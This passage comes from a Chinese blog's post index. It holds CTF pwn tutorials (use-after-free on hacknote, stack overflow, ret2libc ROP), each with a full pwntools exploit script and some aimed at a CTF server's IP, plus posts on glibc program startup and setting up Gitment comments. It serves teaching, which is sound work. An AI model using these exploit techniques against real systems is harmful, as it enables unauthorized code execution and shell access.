class="string">"\x48\x43\x27\x2f\x6f\x65/bin/sh"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>入口函数和程序初始化</title>
    <url>/year/10/11/cl7iordqa004s293f5k4ixdpp/</url>
    <content><![CDATA[<h2 id="0x01-入口函数的作用"><a href="#0x01-入口函数的作用" class="headerlink" title="0x01 入口函数的作用"></a>0x01 入口函数的作用</h2><ul>
<li>操作系统在创建进程后，把控制权交到了程序的入口，这个入口往往是运行库中的某个入口函数。</li>
<li>入口函数对运行库和程序运行环境进行初始化，包括堆、I/O、线程、全局变量构造，等等。</li>
<li>入口函数在完成初始化之后，调用main函数，正式开始执行程序主体部分。</li>
<li>main 函数执行完毕以后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁、关闭I/O等，然后进行系统调用结束进程。<a id="more"></a>
<h2 id="0x02-运行库与I-O"><a href="#0x02-运行库与I-O" class="headerlink" title="0x02 运行库与I/O"></a>0x02 运行库与I/O</h2><h3 id="什么是文件描述符"><a href="#什么是文件描述符" class="headerlink" title="什么是文件描述符"></a>什么是文件描述符</h3></li>
<li>在操作系统层面上，文件操作也有类似于ELF的一个概念，在Linux里，这叫做<strong>文件描述符（File Descriptor）</strong>，而在Windows里，叫做<strong>句柄（Handle）</strong></li>
<li>内核可以通过句柄来计算出内核里文件对象的地址，但此能力并不对用户开放</li>
<li>在程序中打开文件得到的fd从3开始增长。fd具体指什么呢？<strong>在内核中，每一个进程都有一个私有的“打开文件表”，这个表是一个指针数组，每一个元素都指向一个内核打开的文件对象，而fd,就是这个表的下标</strong>。当用户打开一个文件时，内核会在内部生成一个打开文件对象，并在这个表里找到一个空项，让这一向指向生成的打开文件对象，并返回这一项的下表做fd。由于这个表处于内核，并且用户无法访问到，因此用户即使拥有fd，也无法得到打开文件对象的地址，指能够通过系统提供的函数来操作。<h3 id="I-O初始化的职责"><a href="#I-O初始化的职责" class="headerlink" title="I/O初始化的职责"></a>I/O初始化的职责</h3>在用户空间建立stdin，stdout，stderr以及其对应的FILE结构，使得程序进入main之后可以直接使用 printf、scanf 等函数。</li>
</ul>
<h2 id="C语言运行库"><a href="#C语言运行库" class="headerlink" title="C语言运行库"></a>C语言运行库</h2><h3 id="GLIBC-入口函数"><a href="#GLIBC-入口函数" class="headerlink" title="GLIBC 入口函数"></a>GLIBC 入口函数</h3><p>glibc 的程序入口为_start</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _start()</span><br><span class="line">&#123;</span><br><span class="line">    %ebp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> argc = pop from <span class="built_in">stack</span></span><br><span class="line">    cgar ** argv = top of <span class="built_in">stack</span></span><br><span class="line">    __libc_start_main(main, argc, argv, __libc_csu_init, __libc_csu_fini, edx, top of <span class="built_in">stack</span>);</span><br><span class="line">&#125;</span><br><span class="line">其中argv除了指向参数表外，还隐含紧接着环境变量表。这个环境变量表要在__libc_start_main 里从argv 内提取出来。</span><br></pre></td></tr></table></figure>

<h3 id="glibc"><a href="#glibc" class="headerlink" title="glibc"></a>glibc</h3><p>运行库是平台相关的，因为它与操作系统结合的非常紧密。C语言的运行库从某种程度上来讲是C语言的程序和不同操作系统平台之间的抽象层，它将不同的操作系统API抽象成相同的库函数</p>
<p>glibc 的发布版本主要由两部分组成，一部分是头文件，比如stdio.h、stdlib.h等，它们往往位于/usr/include;另外一部分则是库的二进制文件部分</p>
<h3 id="glibc-启动文件"><a href="#glibc-启动文件" class="headerlink" title="glibc 启动文件"></a>glibc 启动文件</h3><ul>
<li>“.init”和“.finit”.运行库会保证位于这两个段中的代码会先于/后于 main()函数执行。</li>
</ul>
]]></content>
      <categories>
        <category>程序员的自我修养</category>
      </categories>
  </entry>
  <entry>
    <title>uaf漏洞入门</title>
    <url>/year/10/11/cl7iordql005j293fomiwkl94/</url>
    <content><![CDATA[<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>uaf即use after free，也就是free后并没有将指针变量置为NULL，然后就可以再次使用那块内存。主要情况有：</p>
<ul>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，<strong>那么程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。<a id="more"></a>

</li>
</ul>
<h2 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"call print my name\n"</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">"I can also use it"</span>;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">"I can also use it"</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"this pogram will crash...\n"</span>);</span><br><span class="line">  a-&gt;func(<span class="string">"can not be printed..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      </span><br><span class="line">this is my function</span><br><span class="line">I can also use it</span><br><span class="line">call print my name</span><br><span class="line">this pogram will crash...</span><br><span class="line">[1]    38738 segmentation fault (core dumped)  ./use_after_free</span><br></pre></td></tr></table></figure>

<p>0x03 例题<br>根据题目我们可以看出程序最多添加5个note。每个note有两个字段，第一个是存储打印函数的地址，另一个是存储内内容的地址。</p>
<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><p>这个函数是向node_list中添加一个note。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  note *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        notelist[i]-&gt;put = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0-&gt;content = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i]-&gt;content )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, notelist[i]-&gt;content, size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h3><p>用node字段的第一个位置存的print_node函数将第二位置存储的content打印出来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h3><p>delete_note 会根据给定的索引释放note。但是只是单纯的进行了free，而并没有设置为NULL，那么显然这里是存在uaf的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-利用分析"><a href="#0x03-利用分析" class="headerlink" title="0x03 利用分析"></a>0x03 利用分析</h2><p><strong>很直接的思路，将note的put函数字段改为后门函数magic函数的地址，从而实现在执行 pirnt node 的时候执行 magic 函数。</strong>所以我们必须利用写content 的时候来进行覆盖。具体采用的思路如下。</p>
<ul>
<li>申请 note0, real content size 为 32 （大小与note大小所在的bin不一样即可）</li>
<li>申请 note1, real content size 为 32 （大小与 note 大小所在的bin不一样即可）</li>
<li>释放 note0</li>
<li>释放 note1</li>
<li>此时，大小为16的 fast bin chunk 中链表为note1-&gt;note0</li>
<li>申请note2, 并设置real content的大小为8，那么根据堆的分配规则</li>
<li>note2 其实会分配 note1 对应的堆块。</li>
<li>real content 对应的chunk其实是note0。</li>
<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用magic函数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>总结一下思路</p>
<ul>
<li>劫持函数地址</li>
<li>利用堆分配的机制，也就是malloc优先分配刚刚free过的相同大小的chunk。利用这一点，将chunk0的内存分配给chunk3 的content</li>
<li>利用uaf向已经被free掉的内存中写入数据。</li>
<li>成功劫持函数。</li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Asuri平台上简单pwn题的题解</title>
    <url>/year/10/04/cl7iordmi0008293fac8ted9f/</url>
    <content><![CDATA[<p>pwn的话一开始确实入门比较困难，学习曲线陡峭是真的，不过只要耐心学习很快也可以入门的，大家加油！</p>
<a id="more"></a>
<h2 id="0x01-checkin"><a href="#0x01-checkin" class="headerlink" title="0x01 checkin"></a>0x01 checkin</h2><p>题目放上来<br><img src="/04/cl7iordmi0008293fac8ted9f/1.png" alt="题目"><br>可能大家看到nc和后面一堆东西，一上来的反应也是懵的，这里解释一下：</p>
<ul>
<li>ncat 或者说 nc 是一款功能类似 cat 的工具，但是是用于网络的。它是一款拥有多种功能的 CLI 工具，可以用来在网络上读、写以及重定向数据</li>
<li>49.235.243.206代表一个服务器的ip地址，8001是这个服务器上的端口号</li>
<li>所以用nc 49.235.243.206 8001连接到那个服务器指定端口上的程序。</li>
</ul>
<p>这道题由于是白给题，所以只要在虚拟机中执行，我们就可以拿到它服务器上的shell（相当于windows上的cmd）。后面的pwn题我们是需要分析它可以执行的这个应用程序，寻找漏洞来获得shell的。</p>
<p><img src="/04/cl7iordmi0008293fac8ted9f/2.png" alt="解答"><br>拿到shell以后<code>ls</code>列出当前目录下文件，我们发现了一个<code>flag</code>文件，这正是我们想要的。所以再<code>cat flag</code>查看文件里的内容就可以了。</p>
<h2 id="0x02-array"><a href="#0x02-array" class="headerlink" title="0x02 array"></a>0x02 array</h2><h3 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h3><p>这道题我们已经不能通过直接nc来获得shell了，但是我们有个这个程序的二进制文件，于是我们可以用ida打开这个文件<br><img src="/04/cl7iordmi0008293fac8ted9f/3.png" alt="题目"><br>可以看到左边有一个函数窗口，右边是汇编代码。一般我们为了快速分析程序的逻辑会首先在函数窗口中选main函数，然后按<code>f5</code>，结果如下：<br><img src="/04/cl7iordmi0008293fac8ted9f/4.png" alt="伪代码"><br><strong>只要我们执行system(“/bin/sh”)我们就可以拿到shell</strong>现在思考我们怎样才能让程序执行这个函数，我们注意到：</p>
<ul>
<li>v7!=99的时候我们可以拿到shell，但是v7被初始化为了99，其它地方好像也没有改v7的操作。</li>
<li>注意到有一个read函数(虽然它叫read但它实际的作用是写)，第一个参数代表写入，第二个参数是要写入的地址，第三个参数代表写入多少个字节。这个函数的意思是，我们可以修改距离v5这个地址v4个字节地方的数据。</li>
<li>所以我们可以把v4设为v7和v5在内存之中的距离，这样我们就可以修改v7中的数据让其不等于99，成功拿到shell了。<h3 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h3><img src="/04/cl7iordmi0008293fac8ted9f/5.png" alt="偏移"><br>在ida中点击v5这个变量，发现他在-0x10这个位置（注意这是16进制）,再看v7在-0x1这个位置，他们之间的距离差了15。<h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3>先输入15，将v4置为15，然后随便输入一个数字就可以把v7修改掉。<br><img src="/04/cl7iordmi0008293fac8ted9f/6.png" alt="结果"><h2 id="0x03-easystack"><a href="#0x03-easystack" class="headerlink" title="0x03 easystack"></a>0x03 easystack</h2>其实说栈溢出才是pwn真正的入门题目<h3 id="分析题目-1"><a href="#分析题目-1" class="headerlink" title="分析题目"></a>分析题目</h3><img src="/04/cl7iordmi0008293fac8ted9f/7.png" alt="题目"></li>
<li>只有一个read函数可以向buf中输入0x64个字节的数据</li>
<li>好像没有system(“/bin/sh”)函数？</li>
<li>发现在函数窗口中有一个sub_4006CD其实是个system(“/bin/sh”)函数。</li>
</ul>
<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>如何调用一个程序原本不会执行的函数，这涉及到一个概念叫做<strong>返回地址</strong>。<br>比如main函数调用一个fun函数的话程序首先会把main函数中当前执行指令的位置保存在内存中的某一个地方，然后再跳转到fun函数中执行，当fun函数执行完毕以后程序就会跳回刚才保存的地址的位置。这个被保存的地址就叫做返回地址。<br>我们可以通过修改main的返回地址，使得程序执行完main函数以后跳转到sub_4006CD这个函数去执行。<br>想深入了解栈溢出的过程的话还是要看<strong>王爽的《汇编语言》</strong>或者南大袁春风的慕课<strong>计算机系统基础</strong><br>这里给一个参考资料，但是需要一定汇编基础。<a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃</a></p>
<p>这个题能做出来的话，阶段性的招新赛和校赛基本上就可以做出几道pwn题了。</p>
<h3 id="寻找buf与返回地址的偏移"><a href="#寻找buf与返回地址的偏移" class="headerlink" title="寻找buf与返回地址的偏移"></a>寻找buf与返回地址的偏移</h3><p>方法有很多种，这里介绍最简单的一种<br><img src="/04/cl7iordmi0008293fac8ted9f/8.png" alt="偏移"><br>r就是那个返回地址,位置在+0x8的位置，buf在-0x10的位置，所以偏移是24</p>
<h3 id="编写利用脚本exp"><a href="#编写利用脚本exp" class="headerlink" title="编写利用脚本exp"></a>编写利用脚本exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                   <span class="comment">#引入pwntools库</span></span><br><span class="line">sh = remote(<span class="string">'49.235.243.206'</span>,<span class="number">8003</span>)  <span class="comment">#创建与靶场服务器的连接</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">24</span>                         <span class="comment">#偏移</span></span><br><span class="line">sub_4006CD_addr = <span class="number">0x4006CD</span>          <span class="comment">#函数地址</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">'a'</span> + p64(sub_4006CD_addr)   <span class="comment">#构造攻击数据</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)                <span class="comment">#向程序发送数据</span></span><br><span class="line">sh.interactive()                    <span class="comment">#将控制流从程序转移到自己这里</span></span><br></pre></td></tr></table></figure>

<p>然后执行脚本python exp.py<br><img src="/04/cl7iordmi0008293fac8ted9f/9.png" alt="结果"><br>利用成功！</p>
<h2 id="0x04-easyrop"><a href="#0x04-easyrop" class="headerlink" title="0x04 easyrop"></a>0x04 easyrop</h2><p>具体<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2libc" target="_blank" rel="noopener">参考资料</a>题目上写的很清楚，这里就给个利用脚本，大家可以看下自己哪里错了，动态调试一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#sh = process('./pwn')</span></span><br><span class="line">sh = remote(<span class="string">'49.235.243.206'</span>,<span class="number">8004</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = <span class="number">0x400530</span>         <span class="comment">#write的got表地址</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>] <span class="comment">#write的plt表地址   </span></span><br><span class="line">main_addr = <span class="number">0x400580</span>         </span><br><span class="line">pop_rdi = <span class="number">0x400773</span>           <span class="comment">#pop_rdi_ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400771</span>       <span class="comment">#pop_rsi_r15_ret</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">24</span></span><br><span class="line"><span class="comment">#设置rdi为1</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#设置rsi为write的got表地址</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment">#rdx可以不用设，因为上一个read函数已经设好了，只要大于8就行</span></span><br><span class="line"><span class="comment">#调用write函数，返回到main函数</span></span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'easy_rop'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">write_addr = u64(sh.recvuntil(<span class="string">'easy_rop'</span>)[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc装载到内存时是整体装载的，所以libc函数之间的偏移是不变得</span></span><br><span class="line"><span class="comment">#但是不同版本的libc函数之间的偏移是不一样的，所以我们需要泄露一个libc函数地址来确定libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment">#调用system('/bin/sh')</span></span><br><span class="line">payload =<span class="string">''</span></span><br><span class="line">payload += <span class="number">24</span>*<span class="string">'a'</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>入门</category>
      </categories>
  </entry>
  <entry>
    <title>给博客添加评论功能</title>
    <url>/year/10/03/cl7iordqp005v293fb47gij8p/</url>
    <content><![CDATA[<p>今天突发奇想想给博客添加一个评论功能，其实以前就有这个想法，但是我记得注册一个第三方平台账户的时候要求我拍什么身份证照片，直接就放弃了。后来看到一个gitment，就是一个用github账号登陆的评论系统，试了一试也失败了，今天重新弄费了九牛二虎之力终于搞好了，写篇博客记录下。</p>
<a id="more"></a>
<h2 id="安装gitment"><a href="#安装gitment" class="headerlink" title="安装gitment"></a>安装gitment</h2><h3 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h3><p>在你的博客根目录安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i --save gitment</span><br></pre></td></tr></table></figure>

<h3 id="申请应用"><a href="#申请应用" class="headerlink" title="申请应用"></a>申请应用</h3><p>首先去<a href="https://github.com/settings/applications/new" target="_blank" rel="noopener">New OAuth App</a>为你的博客申请一个密钥。<br><img src="/03/cl7iordqp005v293fb47gij8p/1.png" alt="申请密钥"><br>申请好之后点注册,然后就可以看到两个东西ClientID和Client Secret,后面会用到.</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>下面就是配置Gitment,主要编辑在themes/next/_config.yml:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Gitment</span></span><br><span class="line"><span class="comment"># Introduction: https://imsun.net/posts/gitment-introduction/</span></span><br><span class="line"><span class="attr">gitment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mint:</span> <span class="literal">true</span> <span class="comment"># RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway</span></span><br><span class="line">  <span class="attr">count:</span> <span class="literal">true</span> <span class="comment"># Show comments count in post meta area</span></span><br><span class="line">  <span class="attr">lazy:</span> <span class="literal">false</span> <span class="comment"># Comments lazy loading with a button</span></span><br><span class="line">  <span class="attr">cleanly:</span> <span class="literal">false</span> <span class="comment"># Hide 'Powered by ...' on footer, and more</span></span><br><span class="line">  <span class="attr">language:</span> <span class="comment"># Force language, or auto switch by theme</span></span><br><span class="line">  <span class="attr">github_user:</span> <span class="string">&#123;you</span> <span class="string">github</span> <span class="string">user</span> <span class="string">id&#125;</span></span><br><span class="line">  <span class="attr">github_repo:</span> <span class="string">随便写一个你的公开的git仓库就行,到时候评论会作为那个项目的issue</span></span><br><span class="line">  <span class="attr">client_id:</span> <span 